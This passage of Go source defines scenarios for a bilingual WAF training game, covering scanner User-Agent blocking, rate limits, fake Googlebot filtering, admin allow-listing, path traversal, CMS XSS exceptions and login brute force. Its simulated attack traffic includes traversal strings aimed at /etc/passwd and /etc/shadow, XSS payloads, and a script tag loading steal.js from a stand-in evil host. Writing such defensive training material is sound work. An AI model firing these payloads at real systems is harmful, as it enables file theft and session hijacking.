			T("ツールによって sqlmap / Nikto のように大文字・小文字の書き方が違うので、すべて小文字に変換してから比べると、1 つの書き方で両方に対応できます。",
				"The tools use different capitalization (sqlmap vs. Nikto). Converting everything to lowercase before comparing lets one spelling cover both."),
			clearNote,
		},
		Steps: []Step{
			addOwnRule,
			S(T("「Rule builder」で Name に block-scanners と入力します。", "In \"Rule builder\", enter block-scanners as the Name."),
				T("1 つのルールに複数の条件を入れると、1 回の Add rule で関連する条件をまとめて管理できます。ログにもこのルール名で出るので、「スキャナーを止めた」ことがすぐわかります。",
					"Putting several statements in one rule lets you manage related conditions together, and the logs show this single rule name, making it clear a scanner was stopped.")),
			S(T("「If a request」で「matches at least one of the statements (OR)」を選びます。", "Set \"If a request\" to \"matches at least one of the statements (OR)\"."),
				T("OR は、どれか 1 つの条件に一致すればルールが一致します。sqlmap と nikto のどちらかが含まれていれば止めたいので OR を使います。AND にすると、両方の名前を含む User-Agent しか止まりません。",
					"With OR, the rule matches if any statement matches. You want to stop requests containing either sqlmap or nikto, so use OR. With AND, only a User-Agent containing both names would be blocked."),
				T("OR を選ぶと条件が 2 つ表示されます。「Add another statement」で条件を増やせます。",
					"Choosing OR shows two statements; use \"Add another statement\" to add more.")),
			S(T("Statement 1: 「Inspect」で「Single header」を選び、Header field name に user-agent と入力します。",
				"Statement 1: set \"Inspect\" to \"Single header\" and enter user-agent as the Header field name."),
				T("Single header は、名前を指定した 1 つのヘッダーの値だけを調べます。ヘッダー名の大文字・小文字は区別されないので、User-Agent と書いても同じです。",
					"Single header inspects the value of one named header. Header names are case-insensitive, so User-Agent works the same."),
				T("All headers を選ぶと、すべてのヘッダーをまとめて調べられます (キーだけ・値だけ・両方を選べます)。どのヘッダーに来るかわからない攻撃に使います。",
					"All headers inspects every header at once (keys, values, or both). Use it for attacks that may arrive in any header.")),
			S(T("Statement 1: 「Match type」で「Contains string」を選び、String to match に sqlmap と入力し、「Text transformation」で「Lowercase」を追加します。",
				"Statement 1: set \"Match type\" to \"Contains string\", enter sqlmap as the String to match, and add \"Lowercase\" under \"Text transformation\"."),
				T("Contains string は、値のどこかにその文字列が含まれていれば一致します。Contains words は、前後が英数字や _ 以外のとき (または値の先頭・末尾のとき) だけ一致します (sqlmap は一致し、mysqlmapper は一致しない)。Exactly matches は完全一致、Starts with / Ends with は前方・後方一致です。",
					"Contains string matches if the string appears anywhere in the value. Contains words only matches when it's surrounded by characters other than letters, digits, and _ (or sits at the start or end of the value) (sqlmap matches, mysqlmapper doesn't). Exactly matches is an exact match, and Starts with / Ends with match the beginning or end."),
				T("文字列の比較は大文字・小文字を区別します。Lowercase で値を小文字にしてから比べると、SQLMap や SQLMAP も止められます。その場合、String to match も小文字で書きます。",
					"String comparison is case-sensitive. Lowercasing the value first catches SQLMap and SQLMAP too; in that case, write the string to match in lowercase as well.")),
			S(T("Statement 2: 同じように Single header (user-agent)・Contains string で nikto と入力し、「Lowercase」を追加します。",
				"Statement 2: likewise, use Single header (user-agent) with Contains string nikto, and add \"Lowercase\"."),
				T("条件ごとにテキスト変換を設定します。Statement 1 に付けた Lowercase は Statement 2 には効かないので、こちらにも追加します。",
					"Text transformations are set per statement. The Lowercase on Statement 1 doesn't apply to Statement 2, so add it here too."),
				T("User-Agent は攻撃者が自由に書き換えられるので、この方法で止められるのは名乗ったままのツールだけです。偽装されたときの見分け方は、チュートリアル 6 の JA4 で学びます。",
					"Attackers can set the User-Agent to anything, so this only stops tools that announce themselves. You'll learn how to spot disguised tools with JA4 in Tutorial 6.")),
			blockAndSave,
			waitAndStart,
		},
		Duration: 30 * time.Second,
		Patterns: []Pattern{
			scanner(T("sqlmap による探索", "Probing by sqlmap"), "sqlmap/1.9.2#stable (https://sqlmap.org)", 20),
			scanner(T("Nikto による探索", "Probing by Nikto"), "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007212)", 20),
			{Benign, lblBrowse, 60, browse},
		},
	})

	register(&Scenario{
		ID:       "tutorial-5-ratelimit",
		Title:    T("チュートリアル 5: レートベースルールで大量アクセスを止める", "Tutorial 5: Stop floods with a rate-based rule"),
		Tutorial: true,
		Summary: T(
			"1 つの IP アドレスから商品ページが大量に読み取られています。一定時間内のリクエスト数でブロックします。",
			"A single IP address is scraping product pages at high volume. Block it based on how many requests it sends in a time window.",
		),
		Topics: []Text{T("レートベースルール", "Rate-based rules"), T("集計キー", "Aggregation keys"), T("評価ウィンドウ", "Evaluation windows")},
		Briefing: []Text{
			T("競合他社のスクレイパーとみられるアクセスが、"+floodIP+" から 1 分あたり 60 回のペースで商品ページを読み取っています。",
				"What looks like a competitor's scraper is reading product pages from "+floodIP+" at 60 requests per minute."),
			T("リクエストの中身は普通の閲覧と同じなので、内容では見分けられません。このようなときは「同じ送信元から一定時間内に何回来たか」で判定するレートベースルールを使います。",
				"The requests look exactly like normal browsing, so you can't tell them apart by content. In cases like this, use a rate-based rule, which decides by how many requests the same source sends within a time window."),
			T("一般のお客様は 1 分に数回しかアクセスしません。", "Regular customers only make a few requests per minute."),
			T("レートベースルールはブロックが始まるまで少し時間がかかります。このチュートリアルは 120 秒間続き、最初の 60 秒の攻撃は採点しません。",
				"Rate-based rules take a little while to start blocking. This tutorial runs for 120 seconds, and attacks in the first 60 seconds are not scored."),
			clearNote,
		},
		Steps: []Step{
			addOwnRule,
			S(T("「Rule builder」で Name に rate-limit と入力し、Type で「Rate-based rule」を選びます。", "In \"Rule builder\", enter rate-limit as the Name and set Type to \"Rate-based rule\"."),
				T("レートベースルールは、リクエストを「集計キー」(送信元 IP など) ごとに数え、上限を超えたキーからのリクエストにアクションを適用します。中身では見分けられない大量アクセスに使います。",
					"A rate-based rule counts requests per aggregation key (such as source IP) and applies its action to keys that exceed the limit. Use it for floods you can't tell apart by content."),
				T("ブロックされるのは上限を超えている間だけです。アクセスが減って上限を下回ると、自動でブロックが解除されます。",
					"Blocking only lasts while the key is over the limit; once its traffic drops below the limit, it's unblocked automatically.")),
			S(T("「Rate limit」に 30、「Evaluation window」に 1 minute を指定します。", "Set \"Rate limit\" to 30 and \"Evaluation window\" to 1 minute."),
				T("Evaluation window は、さかのぼって数える時間の長さです。1・2・5・10 分から選べます。Rate limit は、その時間内に許す回数です (最小 10)。今回は「1 分に 30 回を超えたら止める」という意味になります。",
					"The evaluation window is how far back requests are counted: 1, 2, 5, or 10 minutes. The rate limit is how many requests are allowed in that window (minimum 10). Here, it means \"block anything over 30 requests per minute\"."),
				T("攻撃は 1 分に 60 回、一般のお客様は 1 分に数回なので、30 はその間にあります。上限は、正規のお客様の最大の使い方より十分に上にしておくのがコツです。",
					"The attacker sends 60 per minute and regular customers only a few, so 30 sits between them. The trick is to set the limit well above the heaviest legitimate usage."),
				T("集計はおおよその値で、上限を超えてからブロックが始まるまでに少し時間がかかります。そのため、このチュートリアルは最初の 60 秒の攻撃を採点しません。",
					"Counting is approximate, and blocking starts a little after a key goes over the limit. That's why this tutorial doesn't score attacks in the first 60 seconds.")),
			S(T("「Request aggregation」で「Source IP address」ではなく「IP address in header」を選び、Header field name に X-Forwarded-For、Fallback for missing IP address に No match を指定します。",
				"Under \"Request aggregation\", choose \"IP address in header\" instead of \"Source IP address\". Set Header field name to X-Forwarded-For and Fallback for missing IP address to No match."),
				xffInHeader, xffFormat,
				T("IP セットのルールと違い、レートベースルールには Position の設定がありません。ヘッダーに IP が複数並んでいるときは、常に先頭 (左端) の IP で数えます。",
					"Unlike IP set rules, rate-based rules have no Position setting. When the header lists several IPs, the first (leftmost) one is always used for counting."),
				T("Request aggregation には、ほかに Count all (全体の合計で数える) と Custom keys (ヘッダー・Cookie・クエリのパラメータ・URI パス・JA4 などを組み合わせて数える) があります。",
					"Other aggregation options are Count all (count all requests together) and Custom keys (count by a combination of headers, cookies, query parameters, URI path, JA4, and more)."),
				xffSpoof, xffFallback),
			S(T("「Scope of inspection and rate limiting」は「Consider all requests」のままにします。", "Keep \"Scope of inspection and rate limiting\" as \"Consider all requests\"."),
				T("「Only consider requests that match the criteria in a rule statement」を選ぶと、条件 (スコープダウンステートメント) に一致したリクエストだけを数えて、制限できます。たとえば「/login への POST だけを 1 分に 10 回まで」のように使います (ゲームモードのステージ 5 で使います)。",
					"Choosing \"Only consider requests that match the criteria in a rule statement\" counts and limits only requests matching a scope-down statement, e.g. \"at most 10 POSTs to /login per minute\" (you'll use this in game mode, stage 5).")),
			blockAndSave,
			waitAndStart,
		},
		Duration: 120 * time.Second,
		Warmup:   60 * time.Second,
		Patterns: []Pattern{
			{Attack, T("単一 IP からの大量アクセス ("+floodIP+")", "Flood from a single IP ("+floodIP+")"), 120, func(r *rand.Rand) Request {
				req := get(r, "/products/"+strconv.Itoa(100+r.IntN(900)), "")
				req.ClientIP = floodIP
				return req
			}},
			{Benign, lblBrowse, 60, browse},
		},
	})
}

// ---------------------------------------------------------------------------
// ゲーム: 手順なし。複数条件・例外・テキスト変換・既存ルールの見直しなど応用を扱う
// ---------------------------------------------------------------------------

func registerGames() {
	register(&Scenario{
		ID:    "game-1-fakebot",
		Title: T("ステージ 1: 偽物のクローラー", "Stage 1: The fake crawler"),
		Summary: T(
			"Googlebot を名乗るスクレイパーが現れました。本物の Googlebot は通し、偽物だけを止めてください。",
			"Scrapers are claiming to be Googlebot. Let the real Googlebot through and stop only the fakes.",
		),
		Topics: []Text{T("AND / NOT の組み合わせ", "Combining AND / NOT"), T("IP セット", "IP sets"), T("Lowercase 変換", "Lowercase transformation")},
		Briefing: []Text{
			T("商品ページを大量に読み取るアクセスがあり、User-Agent はどれも Googlebot を名乗っています。しかし、本物の Googlebot も毎日クロールしに来ているので、User-Agent だけで止めると検索結果からサイトが消えてしまいます。",
				"Something is reading product pages in bulk, and every request claims to be Googlebot in its User-Agent. But the real Googlebot also crawls every day, so blocking on User-Agent alone would make the site disappear from search results."),
			T("Google が公開しているクローラーの IP 範囲は "+googleRange+" です（この演習での設定）。本当のアクセス元 IP は X-Forwarded-For ヘッダーの先頭にあります。",
				"Google's published crawler IP range is "+googleRange+" (for this exercise). The real client IP is the first address in the X-Forwarded-For header."),
			T("偽物の中には、googlebot の大文字・小文字を変えて書いているものもあります。", "Some of the fakes write googlebot with different capitalization."),
		},
		Hints: []Text{
			T("「User-Agent に googlebot を含む」AND「IP が Google の範囲ではない」という 2 つの条件を両方満たすものをブロックします。",
				"Block requests that meet both conditions: \"User-Agent contains googlebot\" AND \"IP is not in Google's range\"."),
			T("Google の IP 範囲で IP セットを作り、NOT ステートメントで「含まれない」を表現します。IP セットのステートメントでは X-Forwarded-For を使う設定を忘れずに。",
				"Create an IP set for Google's range and express \"not in\" with a NOT statement. Don't forget to configure the IP set statement to use X-Forwarded-For."),
			T("User-Agent の文字列マッチには Lowercase 変換をかけましょう。", "Apply the Lowercase transformation to the User-Agent string match."),
		},
		PrepSeconds: 420,
		Duration:    30 * time.Second,
		Patterns: []Pattern{
			{Attack, T("Googlebot を名乗るスクレイパー", "Scraper claiming to be Googlebot"), 25, func(r *rand.Rand) Request {
				return withUA(fromAttacker(get(r, "/products/"+strconv.Itoa(100+r.IntN(900)), ""), r), googlebotUA)
			}},
			{Attack, T("大文字で書いた偽 Googlebot", "Fake Googlebot in uppercase"), 15, func(r *rand.Rand) Request {
				return withUA(fromAttacker(get(r, "/products/"+strconv.Itoa(100+r.IntN(900)), ""), r), "Mozilla/5.0 (compatible; GOOGLEBOT/2.1)")
			}},
			{Benign, T("本物の Googlebot ("+googleRange+")", "The real Googlebot ("+googleRange+")"), 20, func(r *rand.Rand) Request {
				req := withUA(browse(r), googlebotUA)
				req.ClientIP = googleIP(r)
				return req
			}},
			{Benign, lblBrowse, 40, browse},
		},
	})

	register(&Scenario{
		ID:    "game-2-admin",
		Title: T("ステージ 2: 管理画面を守れ", "Stage 2: Protect the admin console"),
		Summary: T(
			"管理画面 /admin が外部から狙われています。オフィスからのアクセスだけを許可してください。",
			"The admin console at /admin is being targeted from outside. Allow access only from the office.",
		),
		Topics: []Text{T("URI パスの条件", "URI path conditions"), T("IP セット (許可リスト)", "IP sets (allow list)"), T("AND / NOT", "AND / NOT")},
		Briefing: []Text{
			T("管理画面 /admin は運営オフィスからしか使いません。ところが、世界中の IP アドレスから /admin 配下へのアクセスが届いています。",
				"The admin console at /admin is only ever used from the operations office. Yet requests to /admin and its subpages are arriving from IP addresses all over the world."),
			T("運営オフィスのグローバル IP アドレスは "+officeIP1+" と "+officeIP2+" です。本当のアクセス元 IP は X-Forwarded-For ヘッダーの先頭にあります。",
				"The office's public IP addresses are "+officeIP1+" and "+officeIP2+". The real client IP is the first address in the X-Forwarded-For header."),
			T("一般ユーザーが /admin 以外のページを見るのは自由です。オフィスの運営スタッフの作業も止めないでください。",
				"Regular users are free to view pages other than /admin. Don't block the office staff's work either."),
			T("/Admin のように大文字を混ぜたアクセスも観測されています（このサイトは大文字・小文字を区別せずに同じページを返します）。",
				"Requests with mixed case such as /Admin have also been seen (this site serves the same page regardless of case)."),
		},
		Hints: []Text{
			T("「URI path が /admin で始まる」AND「IP がオフィスの IP セットに含まれない」でブロックします。",
				"Block when \"URI path starts with /admin\" AND \"IP is not in the office IP set\"."),
			T("URI path の条件には Lowercase 変換をかけると /Admin も捕まえられます。", "Apply the Lowercase transformation to the URI path condition to catch /Admin as well."),
		},
		PrepSeconds: 420,
		Duration:    30 * time.Second,
		Patterns: []Pattern{
			admin(T("外部からの /admin アクセス", "External access to /admin"), "/admin"),
			admin(T("/admin 配下のサブページ", "Subpages under /admin"), "/admin/users"),
			admin(T("大文字で書いたパス", "Path written in uppercase"), "/Admin/settings"),
			{Benign, T("オフィスからの管理作業", "Admin work from the office"), 20, func(r *rand.Rand) Request {
				req := get(r, pick(r, []string{"/admin", "/admin/users", "/admin/settings"}), "")
				req.ClientIP = officeIP(r)
				return req
			}},
			{Benign, lblBrowse, 40, browse},
		},
	})

	register(&Scenario{
		ID:    "game-3-traversal",
		Title: T("ステージ 3: ダウンロード機能の悪用", "Stage 3: Abusing the download feature"),
		Summary: T(
			"ファイルダウンロード (GET /download?file=) で、サーバー内部のファイルを読み出そうとする攻撃です。エンコードによるすり抜けに注意してください。",
			"Attackers are using the file download endpoint (GET /download?file=) to read internal server files. Watch out for encoding tricks.",
		),
		Topics: []Text{T("テキスト変換の重ねがけ", "Chaining text transformations"), T("クエリパラメータの検査", "Inspecting query parameters"), T("誤検知への配慮", "Avoiding false positives")},
		Briefing: []Text{
			T("マニュアルや請求書を配布する GET /download?file=<ファイル名> に、ディレクトリを遡る指定（パストラバーサル）が届いています。成功するとサーバーの設定ファイルやパスワードファイルが盗まれます。",
				"GET /download?file=<filename>, which serves manuals and invoices, is receiving paths that climb up the directory tree (path traversal). If they succeed, server config and password files will be stolen."),
			T("単純な ../ のほか、エンコードを 2 回重ねたものや Windows 形式の区切り文字 (\\) を使ったものも観測されています。",
				"Besides plain ../, double-encoded variants and Windows-style separators (\\) have been seen."),
			T("正規のファイル名にはピリオドが 2 つ続くもの（例: release-notes_v1..v2.txt）もあります。ピリオドだけで判定すると誤検知になります。",
				"Some legitimate file names contain two consecutive dots (e.g. release-notes_v1..v2.txt). Matching on dots alone will cause false positives."),
		},
		Hints: []Text{
			T("検査対象は Query string、または file という名前のクエリパラメータ (Single query parameter) です。",
				"Inspect the Query string, or the query parameter named file (Single query parameter)."),
			T("%252e%252e%252f は URL decode を 2 回かけると ../ になります。テキスト変換は複数並べられます。",
				"%252e%252e%252f becomes ../ after URL-decoding twice. You can chain multiple text transformations."),
			T("../ と ..\\ の両方を見る必要があります。OR ステートメントか、正規表現パターンセットでまとめましょう。",
				"You need to catch both ../ and ..\\. Combine them with an OR statement or a regex pattern set."),
		},
		PrepSeconds: 420,
		Duration:    30 * time.Second,
		Patterns: []Pattern{
			traversal(T("基本的な ../ 指定", "Plain ../"), "../../../../etc/passwd"),
			traversal(T("二重 URL エンコード", "Double URL encoding"), "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
			traversal(T("Windows 形式の区切り文字", "Windows-style separators"), `..\..\..\windows\win.ini`),
			traversal(T("フィルター回避用の入れ子表記", "Nested sequences to evade filters"), "....//....//....//etc/shadow"),
			{Benign, T("正規のダウンロード", "Legitimate downloads"), 40, func(r *rand.Rand) Request {
				files := []string{"report-2026.pdf", "manuals/setup-guide.pdf", "invoices/INV-0042.pdf", "release-notes_v1..v2.txt", "catalog.2026..autumn.pdf"}
				return get(r, "/download", q("file", pick(r, files)))
			}},
			{Benign, lblBrowse, 20, browse},
		},
	})

	register(&Scenario{
		ID:    "game-4-cms",
		Title: T("ステージ 4: 編集者だけは HTML を書きたい", "Stage 4: Editors need to write HTML"),
		Summary: T(
			"XSS 対策のルールが、CMS で記事を書く編集者まで止めてしまっています。攻撃は止めたまま、例外を作ってください。",
			"Your XSS rule is also blocking the editors who write articles in the CMS. Keep stopping attacks, but carve out an exception.",
		),
		Topics: []Text{T("例外 (スコープを絞った除外)", "Exceptions (narrowly scoped)"), T("ルールの優先度", "Rule priority"), T("既存ルールの見直し", "Revisiting existing rules")},
		Briefing: []Text{
			T("チュートリアル 2 で作った XSS 対策のおかげで口コミ欄は守られています。ところが、記事を書く編集部から「CMS (POST /cms/articles) に記事を投稿できなくなった」と苦情が来ました。",
				"Thanks to the XSS rule from Tutorial 2, the review form is safe. But the editorial team is complaining that they can no longer publish articles to the CMS (POST /cms/articles)."),
			T("編集部は記事の中で script タグ（外部ウィジェットの埋め込み）や iframe を使います。編集部は運営オフィス（"+officeIP1+" / "+officeIP2+"）から投稿しています。",
				"Editors use script tags (embedded widgets) and iframes in their articles. They post from the operations office ("+officeIP1+" / "+officeIP2+")."),
			xffNote,
			T("一方、攻撃者は口コミ欄だけでなく、外部から CMS にもスクリプトを投稿しようとしています。",
				"Meanwhile, attackers are trying to post scripts not only to the review form but also to the CMS from outside."),
			T("オフィスから CMS への投稿だけを例外にし、それ以外の XSS はこれまでどおり止めてください。",
				"Make an exception only for CMS posts from the office, and keep blocking all other XSS as before."),
		},
		Hints: []Text{
			T("XSS のルールを「Body に XSS がある」AND NOT（「URI path が /cms で始まる」AND「IP がオフィスの IP セットに含まれる」）に作り直す方法があります。",
				"One approach: rebuild the XSS rule as \"body contains XSS\" AND NOT (\"URI path starts with /cms\" AND \"IP is in the office IP set\")."),
			T("別の方法として、XSS ルールより優先度の高い Allow ルールで「オフィスから /cms への投稿」を先に通す方法もあります。Allow はそこで評価が終わることに注意しましょう。",
				"Another approach: an Allow rule with higher priority than the XSS rule that lets \"office posts to /cms\" through first. Remember that Allow stops evaluation right there."),
			T("範囲を広げすぎないように。オフィスでも口コミ欄、外部から CMS は例外にしないでください。",
				"Don't make the exception too broad: neither the review form from the office nor the CMS from outside should be exempt."),
		},
		PrepSeconds: 480,
		Duration:    30 * time.Second,
		Patterns: []Pattern{
			{Attack, T("口コミ欄への script タグ", "script tag in the review form"), 12, func(r *rand.Rand) Request {
				return fromAttacker(comment(r, "<script>alert(document.cookie)</script>"), r)
			}},
			{Attack, T("口コミ欄への img onerror", "img onerror in the review form"), 12, func(r *rand.Rand) Request {
				return fromAttacker(comment(r, `<img src=x onerror=alert(1)>`), r)
			}},
			{Attack, T("外部から CMS へのスクリプト投稿", "Script posted to the CMS from outside"), 16, func(r *rand.Rand) Request {
				return fromAttacker(post(r, "/cms/articles", form("title", "お知らせ", "body", `<p>重要なお知らせ</p><script src="https://evil.example/steal.js"></script>`)), r)
			}},
			{Benign, T("編集部 (オフィス) からの記事投稿", "Articles posted by editors (office)"), 20, func(r *rand.Rand) Request {
				bodies := []string{
					`<h2>秋のセール開始！</h2><p>人気商品が最大 50% オフ。</p><script src="https://widgets.example.com/countdown.js"></script>`,
					`<p>新商品の紹介動画です。</p><iframe src="https://www.youtube.com/embed/abc123" allowfullscreen></iframe>`,
					`<p>レビューキャンペーン実施中</p><script>window.campaignId = "fall-2026";</script>`,
				}
				req := post(r, "/cms/articles", form("title", "編集部より", "body", pick(r, bodies)))
				req.ClientIP = officeIP(r)
				return req
			}},
			{Benign, lblComment, 20, benignComment},
			{Benign, lblBrowse, 20, browse},
		},
	})

	register(&Scenario{
		ID:    "game-5-bruteforce",
		Title: T("ステージ 5: ログインへの総当たりと社内 NAT", "Stage 5: Login brute force and a corporate NAT"),
		Summary: T(
			"1 つの IP アドレスから、ログイン (POST /login) にパスワードの総当たりが続きます。大口の取引先を巻き込まずに止めてください。",
			"A single IP address keeps brute-forcing passwords on the login endpoint (POST /login). Stop it without blocking a major business customer.",
		),
		Topics: []Text{T("スコープダウンステートメント", "Scope-down statements"), T("しきい値の設計", "Choosing thresholds"), T("既存ルールの見直し", "Revisiting existing rules")},
		Briefing: []Text{
			T("POST /login に対して、同じ送信元から 1 分間に 120 回のログイン試行が続いています。リクエストの中身は普通のログインと同じです。",
				"The same source is sending 120 login attempts per minute to POST /login. Each request looks just like a normal login."),
			T("大口の取引先では、多くの社員が 1 つの IP アドレス (社内 NAT, "+corpNATIP+") からサイトを閲覧しています。ログイン以外のページへのアクセスが 1 分あたり約 40 回あります。この会社のアクセスは止めないでください。",
				"At a major business customer, many employees browse the site through a single IP address (corporate NAT, "+corpNATIP+"), making about 40 requests per minute to pages other than login. Don't block this company."),
			xffNote,
			T("このステージは 150 秒間続きます。最初の 60 秒の攻撃は採点しません。", "This stage runs for 150 seconds. Attacks in the first 60 seconds are not scored."),
		},
		Hints: []Text{
			T("チュートリアル 5 のレート制限（しきい値 30、全リクエスト対象）は、社内 NAT も巻き込んでしまいます。",
				"The rate limit from Tutorial 5 (threshold 30, all requests) also catches the corporate NAT."),
			T("レートベースルールの「Scope of inspection」で「Only consider requests that match the criteria in a rule statement」を選び、URI path が /login のものだけを数えるようにしましょう（スコープダウンステートメント）。",
				"In the rate-based rule's \"Scope of inspection\", choose \"Only consider requests that match the criteria in a rule statement\" and count only requests whose URI path is /login (a scope-down statement)."),
			T("ログインだけを数えるなら、しきい値を低くしても一般ユーザーを巻き込みません。全体のレート制限は、しきい値を上げるか見直しましょう。",
				"If you count only logins, a low threshold won't catch regular users. Raise or rethink the threshold of the site-wide rate limit."),
		},
		PrepSeconds: 480,
		Duration:    150 * time.Second,
		Warmup:      60 * time.Second,
		Patterns: []Pattern{
			{Attack, T("単一 IP からのパスワード総当たり", "Password brute force from a single IP"), 300, func(r *rand.Rand) Request {
				req := post(r, "/login", form("username", "admin", "password", fmt.Sprintf("pass%04d", r.IntN(10000))))
				req.ClientIP = bruteForceIP
				return req
			}},
			{Benign, T("一般ユーザーのログイン", "Regular users logging in"), 30, func(r *rand.Rand) Request {
				return post(r, "/login", form("username", fmt.Sprintf("user%03d", r.IntN(1000)), "password", "correct-horse-battery"))
			}},
			{Benign, T("社内 NAT からの大量閲覧", "Heavy browsing from the corporate NAT"), 100, func(r *rand.Rand) Request {
				req := browse(r)
				req.ClientIP = corpNATIP
				return req
			}},
			{Benign, lblBrowse, 40, browse},
		},
	})
}

func scanner(label Text, ua string, count int) Pattern {
	return Pattern{Attack, label, count, func(r *rand.Rand) Request {
		path := pick(r, []string{"/", "/.env", "/wp-login.php", "/admin", "/backup.zip", "/.git/config"})
		return withUA(fromAttacker(get(r, path, ""), r), ua)
	}}
}

func traversal(label Text, file string) Pattern {
	return Pattern{Attack, label, 10, func(r *rand.Rand) Request {
		return fromAttacker(get(r, "/download", q("file", file)), r)
	}}
}

func admin(label Text, path string) Pattern {
	return Pattern{Attack, label, 12, func(r *rand.Rand) Request {
		return fromAttacker(get(r, path, ""), r)
	}}
}
